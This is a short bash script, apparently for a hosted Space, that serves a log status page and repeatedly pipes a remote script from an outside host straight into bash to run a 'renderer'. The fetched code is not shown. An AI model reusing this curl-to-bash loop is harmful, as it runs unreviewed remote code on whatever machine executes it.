#!/usr/bin/env bash
# Status page on 7860 (Spaces need one), and the renderer in a loop: it re-downloads the latest renderer every 6 hours.
mkdir -p www && echo "BDI render machine: starting" > www/index.html
(cd www && python3 -m http.server 7860 >/dev/null 2>&1) &
while true; do
  MAX_MINUTES=360 bash -c 'curl -fsSL https://firstreceive.com/empire/dl/run.sh | bash' 2>&1 | tee -a log.txt | while IFS= read -r l; do
    printf '<pre>%s</pre>' "$(tail -n 40 log.txt | sed 's/</\&lt;/g')" > www/index.html; done
  tail -n 2000 log.txt > log.tmp && mv log.tmp log.txt
  sleep 60
done
